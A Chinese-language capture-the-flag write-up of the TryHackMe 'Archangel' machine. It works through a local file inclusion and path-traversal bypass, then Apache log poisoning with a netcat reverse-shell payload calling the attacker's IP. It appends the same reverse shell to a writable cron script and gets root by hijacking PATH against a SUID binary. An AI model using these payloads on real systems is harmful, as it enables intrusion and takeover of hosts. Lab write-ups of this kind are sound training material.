# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责。

# 发现服务
```
┌──(root💀kali)-[~/tryhackme/Archangel]
└─# nmap -sV -Pn 10.10.228.134     
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-29 05:43 EDT
Nmap scan report for 10.10.228.134
Host is up (0.32s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.39 seconds
```

# 渗透80端口 
## 爆破目录
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://10.10.228.134                                                                        

  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                                                                                                            
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                     
                                                                                                                                                                                                                                            
Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/dirsearch/reports/10.10.228.134/_21-10-29_06-02-36.txt

Error Log: /root/dirsearch/logs/errors-21-10-29_06-02-36.log

Target: http://10.10.228.134/

[06:02:37] Starting:                                         
[06:03:59] 301 -  312B  - /flags  ->  http://10.10.228.134/flags/            
[06:04:06] 301 -  313B  - /images  ->  http://10.10.228.134/images/          
[06:04:06] 200 -    0B  - /images/                                          
[06:04:08] 200 -   19KB - /index.html                                       
[06:04:29] 301 -  312B  - /pages  ->  http://10.10.228.134/pages/            
[06:04:30] 200 -    0B  - /pages/                                           
[06:04:44] 403 -  277B  - /server-status    
```

/flags 转向youtube一个视频，没有其他信息，应该是个兔子洞
其他文件夹没有其他信息

查看网页源代码，在```Send us a mail```里发现一个域名，把```mafialive.thm```写进host文件

```echo "10.10.228.134 mafialive.thm" >> /etc/hosts```

打开mafialive.thm发现flag1

再次爆破目录
```
┌──(root💀kali)-[~/dirsearch]
└─# python3 dirsearch.py -e* -t 100 -u http://mafialive.thm 

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 100 | Wordlist size: 15492

Output File: /root/dirsearch/reports/mafialive.thm/_21-11-01_06-52-00.txt

Error Log: /root/dirsearch/logs/errors-21-11-01_06-52-00.log

Target: http://mafialive.thm/

[06:52:01] Starting: 
[06:53:22] 200 -   59B  - /index.html                                       
[06:53:50] 200 -   34B  - /robots.txt                                                                          
[06:54:02] 200 -  286B  - /test.php   
```

打开test.php，点击网页buttom，url显示出一串路径，修改路径文件名可以访问服务器一些文件的内容，说明存在LFI漏洞


我们用php伪协议输出整个网页的源代码，payloadr如下

```
/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
```
打印出了test.php的源代码，拿到flag2

审阅上传代码
```
<?php
 function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }

      if(isset($_GET["view"])){
      if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
              include $_GET['view'];
            }else{

    echo 'Sorry, Thats not allowed';
            }
 ?>
```

只有满足不出现```../..```和一定出现```/var/www/html/development_testing```这两个字符串的条件下，包含逻辑才会生效

我们用```//```代替```/```就可以绕过不能出现```../..```的限制，读取```/etc/passwd```payload如下

```
/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/..//..//..//..//etc/passwd 
```

解密以后得到用户名
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash

```

由上面可知存在用户archangel.爆破了这个用户的ssh没有结果，只能想其他方法

这边经过测试，得到了apache的access.log的路径
```
/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log
```
# 分析
apache2.4-2.9的版本存在一个文件解析漏洞，结合LFI，我们可以把payload写进日志当中，然后在网页上访问这个日志文件，那么就可以触发反弹shell

首先，我们看正常的日志记录是这样的：
```
10.13.21.169 - - [02/Nov/2021:14:14:38 +0530] "GET /test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/..//..//..//..//etc/passwd HTTP/1.1" 200 1277 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
```

由上面日志可以知道，apache记录了url访问路径和User-Agent的信息

那么我们就可以把php代码写到User-Agent，以上面为例，我们期待的效果是这样的：
```
10.13.21.169 - - [02/Nov/2021:14:14:38 +0530] "GET /test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/..//..//..//..//etc/passwd HTTP/1.1" 200 1277 "-" "<php phpinfo(); ?>"
```

然后在浏览器访问这个日志

如果此时网页上能显示php版本信息，表示我们的php代码可以正常执行

## 攻击
开启burpsuite，我们把payload写到User-Agent：
```
GET /test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log HTTP/1.1
Host: mafialive.thm
User-Agent: "<?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.21.169 4444 >/tmp/f') ?>"
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

```

## 开启监听
```nc -lnvp 4444```

## 触发
```
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log
```

## 接收到反弹shell
```
┌──(root💀kali)-[~/tryhackme/Archangel]
└─# nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.13.21.169] from (UNKNOWN) [10.10.228.134] 54296
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
$ ls
index.html
mrrobot.php
robots.txt
test.php
$ cd /home
$ ls
archangel
$ cd archangel
$ ls
myfiles
secret
user.txt

```

拿到user.txt
同文件夹，secret文件没有读权限，myfiles文件夹里有个密码文件，文件内容又是youtube里那个不要放弃（又名：逗你玩儿）的视频

# 提权到archangel
传linpeas发现有一个archangel的定时任务，这个文件还是可写的
```
www-data@ubuntu:/var/www/html/development_testing$ cat /opt/helloworld.sh
cat /opt/helloworld.sh
#!/bin/bash
echo "hello world" >> /opt/backupfiles/helloworld.txt
www-data@ubuntu:/var/www/html/development_testing$ ls -alh /opt/helloworld.sh
ls -alh /opt/helloworld.sh
-rwxrwxrwx 1 archangel archangel 66 Nov 20  2020 /opt/helloworld.sh

```

## 写shell到定时任务
```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.21.169 4242 >/tmp/f" >> /opt/helloworld.sh
```

## 接收到反弹shell
```
┌──(root💀kali)-[~/tryhackme/Archangel]
└─# nc -lnvp 4242 
listening on [any] 4242 ...
connect to [10.13.21.169] from (UNKNOWN) [10.10.228.134] 37592
/bin/sh: 0: can't access tty; job control turned off
$ whoami
archangel
$ id
uid=1001(archangel) gid=1001(archangel) groups=1001(archangel)
$ 

```

在```/home/archangel/secret```拿到第二个user.txt

# 提权

同文件夹有一个backup文件有SUID权限，下载到靶机用strings命令分析，发现有一个shell片段是：
```
┌──(root💀kali)-[~/tryhackme/Archangel]
└─# strings backup
/lib64/ld-linux-x86-64.so.2
setuid
system
__cxa_finalize
setgid
__libc_start_main
libc.so.6
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
cp /home/user/archangel/myfiles/* /opt/backupfiles
```

## 分析

我们观察上面这一行shell代码
```
cp /home/user/archangel/myfiles/* /opt/backupfiles
```

代码本身是说把```/home/user/archangel/myfiles/*```上的内容通过cp命令拷贝到```/opt/backupfiles```

我们知道，SUID文件是普通用户能够以root运行的文件，这个cp在这个文件虽然是普通用户组发出的命令，但是却是以root身份运行的，也就是说如果我们能够劫持这个命令，改写它的内容，我们就可以利用它来提权。

在linux里，所有用户命令都存储在他的$PATH环境变量里，当我们在终端敲下一个个命令时，linux服务器会从当下用户的环境变量路径里一个个的查找有没有这个命令。如果命令的binary文件存在则执行，不存在则报```command not found```。

## 开始提权

### 查看当前用户的环境变量$PATH
```
echo $PATH
/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

### 把home目录/home/archangel新增到环境变量$PATH当中
```
archangel@ubuntu:~$ export PATH=/home/archangel:$PATH
export PATH=/home/archangel:$PATH
archangel@ubuntu:~$ echo $PATH
echo $PATH
/home/archangel:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
```

### 在新加的$PATH路径下创建一个cp文件，并且给与执行权限
```
archangel@ubuntu:~$ touch cp
touch cp
archangel@ubuntu:~$ chmod +x cp
chmod +x cp
```

### 把下面代码添加到新建的cp文件中
```
#!/bin/bash
bash -p
```

### 查看cp文件
```
archangel@ubuntu:~$ cat cp
cat cp
#!/bin/bash
bash -p
```

### 万事具备，执行SUID文件backup,提权到root
```
archangel@ubuntu:~/secret$ ./backup
./backup
root@ubuntu:~/secret# id
id
uid=0(root) gid=0(root) groups=0(root),1001(archangel)
root@ubuntu:~/secret# whoami
whoami
root
root@ubuntu:~/secret# cat /root/root.txt
cat /root/root.txt
```

# 总结
精彩的靶机，学习到很多新知识。LFI拿shell一般有两种姿势：
1. LFI+上传文件getshell

2. LFI+文件解析漏洞getshell

本文用的是第二种。关于第一种方法，我在[这个靶机](https://www.jianshu.com/p/2c1eb523bec3)里有记录

提权方面，利用了修改环境变量$PATH的方式，这种提权方法需要和SUID结合。本文修改了cp命令，但是也可能修改的是其他命令。比如mv,tar等，这个要根据靶机具体的情况。